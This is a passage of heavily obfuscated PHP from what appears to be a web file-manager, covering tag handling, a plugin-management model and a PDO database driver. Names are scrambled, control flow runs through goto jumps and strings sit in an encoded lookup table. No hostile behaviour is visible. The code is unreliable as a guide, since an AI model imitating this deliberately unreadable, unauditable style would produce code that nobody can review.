(!$f§ìÏŠ«²†) { return array(); } $bÎÕ›ˆ‹§ = Model($E•Ù°Áñ”â[1138])->listSource(array($E•Ù°Áñ”â[407] => array($E•Ù°Áñ”â[408], $f§ìÏŠ«²†))); goto AœàšèÃæ; AœàšèÃæ: if (!$bÎÕ›ˆ‹§ || count($f§ìÏŠ«²†) == $bÎÕ›ˆ‹§[$E•Ù°Áñ”â[367]][$E•Ù°Áñ”â[368]]) { return $bÎÕ›ˆ‹§; } $f›Ñâ©Õ¤ï = array(); $b½Ššİ®¬ğ = array_to_keyvalue($bÎÕ›ˆ‹§[$E•Ù°Áñ”â[84]], $E•Ù°Áñ”â[43], $E•Ù°Áñ”â[393]); goto c¹¢¨×—³; C¾¹ç…«¼œ: if ($f›Ñâ©Õ¤ï) { $this->removeBySource($cíš®Ôæœ¦, $f›Ñâ©Õ¤ï); } return $bÎÕ›ˆ‹§; goto fêËğÇ¬È; d¦§îº‡œ™: $Aºí§ÀöÅÜ = array(); foreach ($Fß—Ö¼œ† as $b¦†«»‹Ôè) { $e‘¨êÒ†  = $b¦†«»‹Ôè[$E•Ù°Áñ”â[85]]; if (!$e‘¨êÒ† ) { continue; } if (!isset($Aºí§ÀöÅÜ[$e‘¨êÒ† ])) { $Aºí§ÀöÅÜ[$e‘¨êÒ† ] = array(); } $Aºí§ÀöÅÜ[$e‘¨êÒ† ][] = $b¦†«»‹Ôè[$E•Ù°Áñ”â[417]]; } $f§ìÏŠ«²† = array(); goto f­ã‰‡ÓÁ±; fêËğÇ¬È: } protected function listData($bßˆæÑ®) { $cšîã´çµ• =& $_SERVER[±á õÁ]; $DÄŠñ ®Â = array($cšîã´çµ•[1455] => 0, $cšîã´çµ•[459] => array($cšîã´çµ•[1723], 0), $cšîã´çµ•[412] => $cšîã´çµ•[1724] . $bßˆæÑ®); $D¤æùÑ»¶ = $cšîã´çµ•[1725]; $eÍé×”öØ× = $this->field($D¤æùÑ»¶)->where($DÄŠñ ®Â)->order($cšîã´çµ•[1726])->select(); return $eÍé×”öØ× ? $eÍé×”öØ× : array(); } protected function addToTag($eç¥•áÖç, $a¡³À¾’È, $b‰®Á­×—) { $aÙÌ¥š¸›ä =& $_SERVER[±á õÁ]; if (!$this->getByTagID($eç¥•áÖç, $b‰®Á­×—) || !$a¡³À¾’È) { return !1; } if (!Model($aÙÌ¥š¸›ä[776])->pathInfo($a¡³À¾’È)) { return !1; } $aš½¡Îì¾‡ = array($aÙÌ¥š¸›ä[1455] => 0, $aÙÌ¥š¸›ä[459] => $b‰®Á­×—, $aÙÌ¥š¸›ä[411] => $a¡³À¾’È, $aÙÌ¥š¸›ä[412] => $aÙÌ¥š¸›ä[1727] . $eç¥•áÖç, $aÙÌ¥š¸›ä[410] => $aÙÌ¥š¸›ä[43], $aÙÌ¥š¸›ä[1625] => 0); if ($this->where($aš½¡Îì¾‡)->find()) { return !1; } return $this->add($aš½¡Îì¾‡); } protected function removeFromTag($c‰ãĞŞ˜©ê, $eé†ŒŞ¨Ì, $B‹‹áµ÷÷) { $C¼•¤ªš‘£ =& $_SERVER[±á õÁ]; if (!$this->getByTagID($c‰ãĞŞ˜©ê, $B‹‹áµ÷÷) || !$eé†ŒŞ¨Ì) { return !1; } if (is_array($eé†ŒŞ¨Ì)) { $eé†ŒŞ¨Ì = array($C¼•¤ªš‘£[7], $eé†ŒŞ¨Ì); } $A¯‘­¢‘Ïí = array($C¼•¤ªš‘£[1455] => 0, $C¼•¤ªš‘£[459] => $B‹‹áµ÷÷, $C¼•¤ªš‘£[412] => $C¼•¤ªš‘£[1727] . $c‰ãĞŞ˜©ê, $C¼•¤ªš‘£[411] => $eé†ŒŞ¨Ì); return $this->where($A¯‘­¢‘Ïí)->delete(); } protected function removeByTag($f¨è˜¡ÊŒë, $FïÖÚ–¾) { $D‹ì¥öÎ =& $_SERVER[±á õÁ]; if (!$this->getByTagID($f¨è˜¡ÊŒë, $FïÖÚ–¾)) { return !1; } $B†î³Åõš‚ = array($D‹ì¥öÎ[1455] => 0, $D‹ì¥öÎ[459] => $FïÖÚ–¾, $D‹ì¥öÎ[412] => $D‹ì¥öÎ[1727] . $f¨è˜¡ÊŒë); return $this->where($B†î³Åõš‚)->delete(); } protected function removeBySource($fœÃ½ÎÔ¨, $b£îÃÒ”ƒ) { $Eã‚òš¨É =& $_SERVER[±á õÁ]; if (!$fœÃ½ÎÔ¨ || !$b£îÃÒ”ƒ) { return !1; } if (is_array($b£îÃÒ”ƒ)) { $b£îÃÒ”ƒ = array($Eã‚òš¨É[7], $b£îÃÒ”ƒ); } $a…ÈÎƒŞÄÓ = array($Eã‚òš¨É[1455] => 0, $Eã‚òš¨É[411] => $b£îÃÒ”ƒ, $Eã‚òš¨É[459] => array($Eã‚òš¨É[944], 0), $Eã‚òš¨É[412] => $Eã‚òš¨É[1727] . $fœÃ½ÎÔ¨); return $this->where($a…ÈÎƒŞÄÓ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\160\154\x75\x67\151\156\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\164\x61\x74\165\x73", "\162\x65\147\x69\145\163\x74", "\143\x6f\x6e\146\151\x67"); public function loadList($CÓ••ëÑ‹ = false) { $dåÛİ÷ÇÉ¤ = array_to_keyvalue($this->listData(), $_SERVER[±á õÁ][38]); if ($CÓ••ëÑ‹) { return $dåÛİ÷ÇÉ¤[$CÓ••ëÑ‹]; } return $dåÛİ÷ÇÉ¤; } public function init() { $a‰‹Ù±Ä³¿ =& $_SERVER[±á õÁ]; Hook::trigger($a‰‹Ù±Ä³¿[1728]); $fê¸‚ì·° = $this->loadPluginList(); foreach ($fê¸‚ì·° as $eïÙ¿åÑÏ => $cèÙÉÏ±Ì…) { $e¤ŒÀƒĞÉ  = $this->appAllow($eïÙ¿åÑÏ, $cèÙÉÏ±Ì…); if (!$e¤ŒÀƒĞÉ ) { continue; } foreach ($cèÙÉÏ±Ì…[$a‰‹Ù±Ä³¿[1729]] as $AîêÁàŸŞà => $C›ÌâÀ¿Ó) { Hook::bind($AîêÁàŸŞà, $C›ÌâÀ¿Ó); } } Hook::trigger($a‰‹Ù±Ä³¿[1730]); Hook::trigger(ACTION); } public function appAllow($AöİÁ‡İ†, $B»ÛËåÚƒ, $A–Ş‚Í„öã = true) { $AÆõ™Œ‚ =& $_SERVER[±á õÁ]; $cÜ†“„ = PLUGIN_DIR . $AöİÁ‡İ† . $AÆõ™Œ‚[1731]; if (!is_array($B»ÛËåÚƒ) || !is_array($B»ÛËåÚƒ[$AÆõ™Œ‚[1729]]) || !is_file($cÜ†“„) || $B»ÛËåÚƒ[$AÆõ™Œ‚[714]] != 1) { return !1; } if ($A–Ş‚Í„öã && !Action($AÆõ™Œ‚[1732])->checkAuth($AöİÁ‡İ†)) { return !1; } return !0; } public function unInstall($B„ñÍ–£ø†) { $dä‚âÃÍŠÉ =& $_SERVER[±á õÁ]; $CàÁõŠáâÈ = $this->loadList($B„ñÍ–£ø†); if (file_exists(PLUGIN_DIR . $B„ñÍ–£ø†)) { Hook::apply($B„ñÍ–£ø† . $dä‚âÃÍŠÉ[1733]); } $this->remove($CàÁõŠáâÈ[$dä‚âÃÍŠÉ[391]]); } public function changeStatus($DÎ…ˆÄÜçÂ, $E•œ‡…½®ï) { $B«ö—Ã¯­Ô =& $_SERVER[±á õÁ]; $fÚŒ•¾œœ = $this->loadList($DÎ…ˆÄÜçÂ); if ($E•œ‡…½®ï) { Hook::apply($DÎ…ˆÄÜçÂ . $B«ö—Ã¯­Ô[1734]); } $this->update($fÚŒ•¾œœ[$B«ö—Ã¯­Ô[391]], array($B«ö—Ã¯­Ô[1735] => $E•œ‡…½®ï)); } public function appRegist($d›ƒ¯„åĞÑ, $DÑº…§ó•¤) { $d´ÎÓ”¨‹ç =& $_SERVER[±á õÁ]; $f˜ÃÎ¼Ê¯Ş = $this->loadList($d›ƒ¯„åĞÑ); if ($f˜ÃÎ¼Ê¯Ş) { $this->update($f˜ÃÎ¼Ê¯Ş[$d´ÎÓ”¨‹ç[391]], array($d´ÎÓ”¨‹ç[1729] => $DÑº…§ó•¤)); } else { $E¡·Ø¦†³¯ = array($d´ÎÓ”¨‹ç[38] => $d›ƒ¯„åĞÑ, $d´ÎÓ”¨‹ç[1729] => $DÑº…§ó•¤, $d´ÎÓ”¨‹ç[714] => 0, $d´ÎÓ”¨‹ç[6] => $this->getConfigDefault($d›ƒ¯„åĞÑ)); $this->insert($E¡·Ø¦†³¯); } } public function getConfigDefault($Aã‘™Ìó‹Í) { $e‰ƒÀĞ”“ =& $_SERVER[±á õÁ]; $bÁ›ˆèºŞé = array(); $Bš®ê©”Ÿµ = $this->getPackageJson($Aã‘™Ìó‹Í); if (!$Bš®ê©”Ÿµ && is_array($Bš®ê©”Ÿµ[$e‰ƒÀĞ”“[1736]])) { return $bÁ›ˆèºŞé; } foreach ($Bš®ê©”Ÿµ[$e‰ƒÀĞ”“[1736]] as $Fƒòé»˜º => $C„â›‚ÙÂ¹) { if (!isset($C„â›‚ÙÂ¹[$e‰ƒÀĞ”“[375]]) || isset($bÁ›ˆèºŞé[$Fƒòé»˜º])) { continue; } $bÁ›ˆèºŞé[$Fƒòé»˜º] = $C„â›‚ÙÂ¹[$e‰ƒÀĞ”“[375]]; } return $bÁ›ˆèºŞé; } public function getPackageJson($e‚›äÉ†òà) { return Hook::apply($e‚›äÉ†òà . $_SERVER[±á õÁ][1737]); } public function getConfig($D²İğÈŠõ­, $BÓ¦óóö¡” = false) { $F•·“®™š =& $_SERVER[±á õÁ]; $BãÌøĞ‘¡Î = array(); $Fêñãóõ– = $this->loadList($D²İğÈŠõ­); if ($Fêñãóõ– && is_array($Fêñãóõ–[$F•·“®™š[6]])) { $BãÌøĞ‘¡Î = $Fêñãóõ–[$F•·“®™š[6]]; } if (!$BãÌøĞ‘¡Î || $BÓ¦óóö¡”) { $BãÌøĞ‘¡Î = $this->getConfigDefault($D²İğÈŠõ­); } return $BãÌøĞ‘¡Î; } public function setConfig($AÖŸ¹Ø†¹, $AÜ¿ÚåÔ = false) { goto d¼‘µ†ƒÓÀ; fÇ²†µëÌ©: $f­İê¹ĞÕ = $F§—ÒµâÌ›[$A…Û‰µ”²[6]]; if ($AÜ¿ÚåÔ == !1) { $f­İê¹ĞÕ = array(); $AÜ¿ÚåÔ = $this->getConfigDefault($AÖŸ¹Ø†¹); } foreach ($AÜ¿ÚåÔ as $EØÒØÃ»®‹ => $aÙ½¸›¦Ùæ) { $f­İê¹ĞÕ[$EØÒØÃ»®‹] = is_string($aÙ½¸›¦Ùæ) ? trim($aÙ½¸›¦Ùæ) : $aÙ½¸›¦Ùæ; } goto AÑ”ªÀÄŞË; d¼‘µ†ƒÓÀ: $A…Û‰µ”² =& $_SERVER[±á õÁ]; $F§—ÒµâÌ› = $this->loadList($AÖŸ¹Ø†¹); if (!$F§—ÒµâÌ›) { return !1; } goto fÇ²†µëÌ©; AÑ”ªÀÄŞË: $this->update($F§—ÒµâÌ›[$A…Û‰µ”²[391]], array($A…Û‰µ”²[6] => $f­İê¹ĞÕ)); goto C£Ëˆí†¨; C£Ëˆí†¨: } public function viewList() { goto Aùö÷ØõÀÙ; b™–æºÔòÅ: return $dÂãôã·È; goto aºï‡‘³•²; FİÜËÎ´¡: $c—«ÚÑµğŒ = $this->loadPluginList(); $dÂãôã·È = array(); foreach ($c—«ÚÑµğŒ as $BÖ„ó¯Ñ„† => $bçñÉùùÀ) { unset($bçñÉùùÀ[$A¾÷–™«[1729]], $bçñÉùùÀ[$A¾÷–™«[6]]); $C§¯™·Â¨ñ = PLUGIN_DIR . $bçñÉùùÀ[$A¾÷–™«[38]] . $A¾÷–™«[1731]; if (!is_file($C§¯™·Â¨ñ)) { continue; } $fÂé»ÆÔÔ = Hook::apply($bçñÉùùÀ[$A¾÷–™«[38]] . $A¾÷–™«[1737]); if (is_array($fÂé»ÆÔÔ)) { $dÂãôã·È[$BÖ„ó¯Ñ„†] = array_merge($bçñÉùùÀ, $fÂé»ÆÔÔ); } } goto b™–æºÔòÅ; Aùö÷ØõÀÙ: $A¾÷–™« =& $_SERVER[±á õÁ]; $c—«ÚÑµğŒ = $this->loadList(); $this->pluginScan($c—«ÚÑµğŒ); goto FİÜËÎ´¡; aºï‡‘³•²: } private function loadPluginList() { $EÒ§¤µ•®× =& $_SERVER[±á õÁ]; $B›„¦ù–š± = $this->loadList(); if (strtolower(MOD) == $EÒ§¤µ•®×[1738]) { return $B›„¦ù–š±; } $BŒºÜß‹„ = Hook::trigger($EÒ§¤µ•®×[1739], $B›„¦ù–š±); if ($B›„¦ù–š± && !$BŒºÜß‹„) { die; } return $BŒºÜß‹„ ? $BŒºÜß‹„ : $B›„¦ù–š±; } private function pluginScan($e¯©Ñ°µ´æ) { $F¾İ¸è‹§ =& $_SERVER[±á õÁ]; recursion_dir(PLUGIN_DIR, $cƒ‘Ãˆ×, $CÄ©Í±±Â£, 0); foreach ($cƒ‘Ãˆ× as $f£‘î‘³è•) { $AŠÛÎÅ¼Ü = get_path_this($f£‘î‘³è•); if (isset($e¯©Ñ°µ´æ[$AŠÛÎÅ¼Ü]) || !file_exists($f£‘î‘³è• . $F¾İ¸è‹§[1740]) || !file_exists($f£‘î‘³è• . $F¾İ¸è‹§[1731])) { continue; } Hook::apply($AŠÛÎÅ¼Ü . $F¾İ¸è‹§[1734]); } } } goto bœøíàˆÉ; EàÌ¾¹¿Ü¸: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($cé ºÍë¶ = '') { $BôÆ†‰í¤‘ =& $_SERVER[±á õÁ]; if (!class_exists($BôÆ†‰í¤‘[846])) { think_exception(think_lang($BôÆ†‰í¤‘[20]) . $BôÆ†‰í¤‘[847]); } if (!empty($cé ºÍë¶)) { $this->config = $cé ºÍë¶; if (empty($this->config[$BôÆ†‰í¤‘[23]])) { $this->config[$BôÆ†‰í¤‘[23]] = array(); } } } public function connect($AµÕÈŒ«· = '', $dï£î“ğÁ¯ = 0) { $cß±áøÑ“ =& $_SERVER[±á õÁ]; if (!isset($this->linkID[$dï£î“ğÁ¯])) { goto fˆ£®¶¤±…; cƒ÷Üñ™: $this->dbType = $this->_getDsnType($AµÕÈŒ«·[$cß±áøÑ“[848]]); if (in_array($this->dbType, array($cß±áøÑ“[849], $cß±áøÑ“[850], $cß±áøÑ“[851], $cß±áøÑ“[852]))) { think_exception($cß±áøÑ“[853] . $this->dbType . $cß±áøÑ“[854] . $this->dbType . $cß±áøÑ“[855]); } if (!$this->linkID[$dï£î“ğÁ¯]) { think_exception($cß±áøÑ“[856]); } goto F‚¹ÂáÔÔ‰; F‚¹ÂáÔÔ‰: try { $this->linkID[$dï£î“ğÁ¯]->exec($cß±áøÑ“[857] . think_config($cß±áøÑ“[824])); } catch (Exception $Cß¹‘Ï¼âê) { } $this->connected = !0; if (1 != think_config($cß±áøÑ“[28])) { unset($this->config); } goto A»×‡¢‹†; fˆ£®¶¤±…: if (empty($AµÕÈŒ«·)) { $AµÕÈŒ«· = $this->config; } if ($this->pconnect) { $AµÕÈŒ«·[$cß±áøÑ“[23]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$dï£î“ğÁ¯] = new PDO($AµÕÈŒ«·[$cß±áøÑ“[848]], $AµÕÈŒ«·[$cß±áøÑ“[821]], $AµÕÈŒ«·[$cß±áøÑ“[822]], $AµÕÈŒ«·[$cß±áøÑ“[23]]); } catch (PDOException $Cß¹‘Ï¼âê) { think_exception($Cß¹‘Ï¼âê->getMessage()); } goto cƒ÷Üñ™; A»×‡¢‹†: } return $this->linkID[$dï£î“ğÁ¯]; } public function free() { $this->PDOStatement = null; } public function query($Bµä‚öâ¼Ì, $Cïæˆ“ï = array()) { goto EÆĞµÚ½À—; cƒˆîÂ‰ÌÆ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $AõŞÒƒ«Ë× = $this->PDOStatement->execute($Cïæˆ“ï); $this->debug(); goto A•¸÷è¥¿; A•¸÷è¥¿: if (!1 === $AõŞÒƒ«Ë×) { $this->error(); return !1; } else { return $this->getAll(); } goto a¼¢ ì˜ƒ; a¿ë–ğ¿™: think_action_status($Fø« ë™ÑĞ[29], 1); think_status($Fø« ë™ÑĞ[30]); $this->PDOStatement = $this->_linkID->prepare($Bµä‚öâ¼Ì); goto cƒˆîÂ‰ÌÆ; c°¦ê·õö¿: $this->queryStr = $Bµä‚öâ¼Ì; if (!empty($Cïæˆ“ï)) { $this->queryStr .= $Fø« ë™ÑĞ[858] . print_r($Cïæˆ“ï, !0) . $Fø« ë™ÑĞ[859]; } if (!empty($this->PDOStatement)) { $this->free(); } goto a¿ë–ğ¿™; EÆĞµÚ½À—: $Fø« ë™ÑĞ =& $_SERVER[±á õÁ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c°¦ê·õö¿; a¼¢ ì˜ƒ: } public function execute($Aàš™ï‹·, $B½¥Š’ÑÎ = array()) { goto fÂÇÕˆ­; e­ùãÙ³í¯: think_status($dß¶‘çî•“[30]); $this->PDOStatement = $this->_linkID->prepare($Aàš™ï‹·); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto aÊ—‰¢‘«; FÉó·…ŸïÑ: $this->queryStr = $Aàš™ï‹·; if (!empty($B½¥Š’ÑÎ)) { $this->queryStr .= $dß¶‘çî•“[858] . print_r($B½¥Š’ÑÎ, !0) . $dß¶‘çî•“[859]; } $EÏã‡±Şã— = !1; goto B³¦ôŸ¡ß; B³¦ôŸ¡ß: if ($this->dbType == $dß¶‘çî•“[852]) { if (preg_match($dß¶‘çî•“[860], $this->queryStr, $fõôíçğÄ)) { $this->table = think_config($dß¶‘çî•“[861]) . str_ireplace(think_config($dß¶‘çî•“[862]), $dß¶‘çî•“[18], $fõôíçğÄ[2]); $EÏã‡±Şã— = (bool) $this->query($dß¶‘çî•“[863] . strtoupper($this->table) . $dß¶‘çî•“[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($dß¶‘çî•“[31], 1); goto e­ùãÙ³í¯; aÊ—‰¢‘«: $EÍ·Ïì×œá = $this->PDOStatement->execute($B½¥Š’ÑÎ); $this->debug(); if (!1 === $EÍ·Ïì×œá) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($EÏã‡±Şã— || preg_match($dß¶‘çî•“[864], $Aàš™ï‹·)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto a†‚©™«ë; fÂÇÕˆ­: $dß¶‘çî•“ =& $_SERVER[±á õÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÉó·…ŸïÑ; a†‚©™«ë: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f—¡¬ = $this->_linkID->commit(); $this->transTimes = 0; if (!$f—¡¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $D÷ß½ñØ²Ì = $this->_linkID->rollback(); $this->transTimes = 0; if (!$D÷ß½ñØ²Ì) { $this->error(); return !1; } } return !0; } private function getAll() { $E ³…ïó‚‰ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($E ³…ïó‚‰); return $E ³…ïó‚‰; } public function getFields($b¤É’Å•Îí) { goto AÉ§‡½°¿˜; AÉ§‡½°¿˜: $däÁß÷ÔÌ =& $_SERVER[±á õÁ]; $this->initConnect(!0); if (think_config($däÁß÷ÔÌ[865])) { $A ä±¥ßŞ¤ = str_replace($däÁß÷ÔÌ[866], $b¤É’Å•Îí, think_config($däÁß÷ÔÌ[865])); } else { switch ($this->dbType) { case $däÁß÷ÔÌ[849]: case $däÁß÷ÔÌ[867]: $A ä±¥ßŞ¤ = "\123\x45\x4c\105\x43\124\40\40\40\143\x6f\154\165\155\x6e\137\x6e\x61\x6d\145\x20\141\x73\40\47\x4e\x61\155\x65\x27\54\x20\40\x20\x64\141\164\141\137\x74\171\x70\145\40\x61\163\40\x27\124\171\160\145\47\54\40\40\x20\143\157\154\165\155\156\x5f\144\145\146\141\165\154\164\x20\141\x73\x20\x27\104\x65\146\141\x75\x6c\x74\47\x2c\40\x20\x20\x69\163\137\x6e\x75\154\154\141\142\154\145\x20\141\x73\40\47\x4e\x75\154\x6c\x27\xa\x9\11\x46\x52\117\115\11\x69\x6e\x66\x6f\162\155\x61\x74\x69\157\x6e\x5f\163\143\x68\x65\x6d\141\56\164\x61\142\154\x65\x73\x20\101\x53\x20\164\xa\x9\x9\x4a\x4f\111\x4e\x9\x69\x6e\x66\157\x72\155\141\x74\x69\x6f\156\137\163\x63\150\x65\x6d\141\x2e\143\x6f\154\x75\155\156\163\x20\101\123\40\143\12\11\11\x4f\116\x20\x20\x74\56\164\x61\142\x6c\x65\137\143\x61\x74\x61\x6c\157\x67\40\75\x20\143\56\x74\141\142\x6c\x65\137\x63\141\164\141\x6c\x6f\x67\12\x9\x9\101\116\x44\40\x74\x2e\164\x61\142\154\x65\x5f\x73\143\150\x65\155\x61\x20\75\40\143\x2e\164\x61\x62\154\x65\137\x73\143\x68\x65\155\141\12\x9\11\101\x4e\x44\40\x74\x2e\164\141\x62\x6c\x65\137\x6e\141\155\145\x20\75\x20\143\56\164\x61\x62\154\x65\137\x6e\141\155\x65\xa\x9\11\x57\110\105\x52\105\x20\x20\x20\164\56\x74\x61\142\154\x65\137\156\141\x6d\x65\40\x3d\x20\47{$b¤É’Å•Îí}\47"; break; case $däÁß÷ÔÌ[868]: $A ä±¥ßŞ¤ = $däÁß÷ÔÌ[869] . $b¤É’Å•Îí . $däÁß÷ÔÌ[870]; break; case $däÁß÷ÔÌ[850]: case $däÁß÷ÔÌ[852]: $A ä±¥ßŞ¤ = $däÁß÷ÔÌ[871] . $däÁß÷ÔÌ[872] . $däÁß÷ÔÌ[873] . strtoupper($b¤É’Å•Îí) . $däÁß÷ÔÌ[874] . strtoupper($b¤É’Å•Îí) . $däÁß÷ÔÌ[875]; break; case $däÁß÷ÔÌ[876]: $A ä±¥ßŞ¤ = $däÁß÷ÔÌ[877] . $b¤É’Å•Îí . $däÁß÷ÔÌ[878]; break; case $däÁß÷ÔÌ[851]: break; case $däÁß÷ÔÌ[879]: default: $A ä±¥ßŞ¤ = $däÁß÷ÔÌ[880] . ($this->dbType == $däÁß÷ÔÌ[879] ? "\140{$b¤É’Å•Îí}\140" : $b¤É’Å•Îí); } } goto a¦—°Ş„¡; a¦—°Ş„¡: $a·»°Ä¸Ù = $this->query($A ä±¥ßŞ¤); $BİŒ‡ø‚ß° = array(); if ($a·»°Ä¸Ù) { foreach ($a·»°Ä¸Ù as $E£Ÿ¿ÓâòÌ => $eÒºâ½ôí) { $eÒºâ½ôí = array_change_key_case($eÒºâ½ôí); $eÒºâ½ôí[$däÁß÷ÔÌ[38]] = isset($eÒºâ½ôí[$däÁß÷ÔÌ[38]]) ? $eÒºâ½ôí[$däÁß÷ÔÌ[38]] : $däÁß÷ÔÌ[18]; $eÒºâ½ôí[$däÁß÷ÔÌ[39]] = isset($eÒºâ½ôí[$däÁß÷ÔÌ[39]]) ? $eÒºâ½ôí[$däÁß÷ÔÌ[39]] : $däÁß÷ÔÌ[18]; $cÖÚ÷ÍìæÑ = isset($eÒºâ½ôí[$däÁß÷ÔÌ[276]]) ? $eÒºâ½ôí[$däÁß÷ÔÌ[276]] : $eÒºâ½ôí[$däÁß÷ÔÌ[38]]; $BİŒ‡ø‚ß°[$cÖÚ÷ÍìæÑ] = array($däÁß÷ÔÌ[38] => $cÖÚ÷ÍìæÑ, $däÁß÷ÔÌ[39] => $eÒºâ½ôí[$däÁß÷ÔÌ[39]], $däÁß÷ÔÌ[41] => (bool) (isset($eÒºâ½ôí[$däÁß÷ÔÌ[109]]) && $eÒºâ½ôí[$däÁß÷ÔÌ[109]] === $däÁß÷ÔÌ[43] || isset($eÒºâ½ôí[$däÁß÷ÔÌ[41]]) && $eÒºâ½ôí[$däÁß÷ÔÌ[41]] === $däÁß÷ÔÌ[43]), $däÁß÷ÔÌ[44] => isset($eÒºâ½ôí[$däÁß÷ÔÌ[44]]) ? $eÒºâ½ôí[$däÁß÷ÔÌ[44]] : (isset($eÒºâ½ôí[$däÁß÷ÔÌ[63]]) ? $eÒºâ½ôí[$däÁß÷ÔÌ[63]] : $däÁß÷ÔÌ[18]), $däÁß÷ÔÌ[46] => isset($eÒºâ½ôí[$däÁß÷ÔÌ[99]]) ? strtolower($eÒºâ½ôí[$däÁß÷ÔÌ[99]]) == $däÁß÷ÔÌ[48] : (isset($eÒºâ½ôí[$däÁß÷ÔÌ[64]]) ? $eÒºâ½ôí[$däÁß÷ÔÌ[64]] : !1), $däÁß÷ÔÌ[49] => isset($eÒºâ½ôí[$däÁß÷ÔÌ[881]]) ? strtolower($eÒºâ½ôí[$däÁß÷ÔÌ[881]]) == $däÁß÷ÔÌ[51] : (isset($eÒºâ½ôí[$däÁß÷ÔÌ[99]]) ? $eÒºâ½ôí[$däÁß÷ÔÌ[99]] : !1)); } } goto d‘¹Ô‘Ï; d‘¹Ô‘Ï: return $BİŒ‡ø‚ß°; goto A…Ğ†‹¢¥; A…Ğ†‹¢¥: } public function getTables($Fğ¶–åÒ‡Æ = '') { $d‡ŞÇõ¯ªÃ =& $_SERVER[±á õÁ]; if (think_config($d‡ŞÇõ¯ªÃ[882])) { $c¥ÖäêñŠ = str_replace($d‡ŞÇõ¯ªÃ[883], $Fğ¶–åÒ‡Æ, think_config($d‡ŞÇõ¯ªÃ[882])); } else { switch ($this->dbType) { case $d‡ŞÇõ¯ªÃ[850]: case $d‡ŞÇõ¯ªÃ[852]: $c¥ÖäêñŠ = $d‡ŞÇõ¯ªÃ[884]; break; case $d‡ŞÇõ¯ªÃ[849]: case $d‡ŞÇõ¯ªÃ[867]: $c¥ÖäêñŠ = $d‡ŞÇõ¯ªÃ[885]; break; case $d‡ŞÇõ¯ªÃ[876]: $c¥ÖäêñŠ = $d‡ŞÇõ¯ªÃ[886]; break; case $d‡ŞÇõ¯ªÃ[851]: think_exception(think_lang($d‡ŞÇõ¯ªÃ[887]) . $d‡ŞÇõ¯ªÃ[888]); break; case $d‡ŞÇõ¯ªÃ[868]: $c¥ÖäêñŠ = $d‡ŞÇõ¯ªÃ[52] . $d‡ŞÇõ¯ªÃ[53] . $d‡ŞÇõ¯ªÃ[54]; break; case $d‡ŞÇõ¯ªÃ[879]: default: if (!empty($Fğ¶–åÒ‡Æ)) { $c¥ÖäêñŠ = $d‡ŞÇõ¯ªÃ[832] . $Fğ¶–åÒ‡Æ . $d‡ŞÇõ¯ªÃ[833]; } else { $c¥ÖäêñŠ = $d‡ŞÇõ¯ªÃ[834]; } } } $dáî©ÑÙñ = $this->query($c¥ÖäêñŠ); $E¥ÍÑõõ‹ß = array(); foreach ($dáî©ÑÙñ as $E¯å¦…ó÷ => $c˜˜İ‹òè) { $E¥ÍÑõõ‹ß[$E¯å¦…ó÷] = current($c˜˜İ‹òè); } return $E¥ÍÑõõ‹ß; } protected function parseLimit($dëËÇòŸÄ) { $aºã¾ÉÈ¹« =& $_SERVER[±á õÁ]; $BÖÑ¨È”³¦ = $aºã¾ÉÈ¹«[43]; if (!empty($dëËÇòŸÄ)) { switch ($this->dbType) { case $aºã¾ÉÈ¹«[876]: case $aºã¾ÉÈ¹«[868]: $dëËÇòŸÄ = explode($aºã¾ÉÈ¹«[57], $dëËÇòŸÄ); if (count($dëËÇòŸÄ) > 1) { $BÖÑ¨È”³¦ .= $aºã¾ÉÈ¹«[58] . $dëËÇòŸÄ[1] . $aºã¾ÉÈ¹«[59] . $dëËÇòŸÄ[0] . $aºã¾ÉÈ¹«[60]; } else { $BÖÑ¨È”³¦ .= $aºã¾ÉÈ¹«[58] . $dëËÇòŸÄ[0] . $aºã¾ÉÈ¹«[60]; } break; case $aºã¾ÉÈ¹«[849]: case $aºã¾ÉÈ¹«[867]: break; case $aºã¾ÉÈ¹«[851]: break; case $aºã¾ÉÈ¹«[850]: case $aºã¾ÉÈ¹«[852]: break; case $aºã¾ÉÈ¹«[879]: default: $BÖÑ¨È”³¦ .= $aºã¾ÉÈ¹«[58] . $dëËÇòŸÄ . $aºã¾ÉÈ¹«[60]; } } return $BÖÑ¨È”³¦; } public function parseKey(&$cÄ„ÒÓˆ², $cØ«Ú²ÏÑ = true) { $eííè¸Š†Ü =& $_SERVER[±á õÁ]; if ($cØ«Ú²ÏÑ) { $cÄ„ÒÓˆ² = $this->parseKeyCheck($cÄ„ÒÓˆ²); } if ($this->dbType == $eííè¸Š†Ü[879]) { if ($cÄ„ÒÓˆ² != $eííè¸Š†Ü[190] && !preg_match($eííè¸Š†Ü[844], $cÄ„ÒÓˆ²)) { $cÄ„ÒÓˆ² = $eííè¸Š†Ü[383] . trim($cÄ„ÒÓˆ², $eííè¸Š†Ü[383]) . $eííè¸Š†Ü[383]; } return $cÄ„ÒÓˆ²; } else { return parent::parseKey($cÄ„ÒÓˆ²); } } public function close() { $this->_linkID = null; } public function error() { $Aì¥“¢ä–È =& $_SERVER[±á õÁ]; if ($this->PDOStatement) { $d„²Àê×¹õ = $this->PDOStatement->errorInfo(); $this->error = $d„²Àê×¹õ[1] . $Aì¥“¢ä–È[4] . $d„²Àê×¹õ[2]; } else { $this->error = $Aì¥“¢ä–È[43]; } if ($Aì¥“¢ä–È[43] != $this->queryStr) { $this->error .= LNG($Aì¥“¢ä–È[55]) . $this->queryStr; } think_trace($this->error, $Aì¥“¢ä–È[43], $Aì¥“¢ä–È[56]); return $this->error; } public function 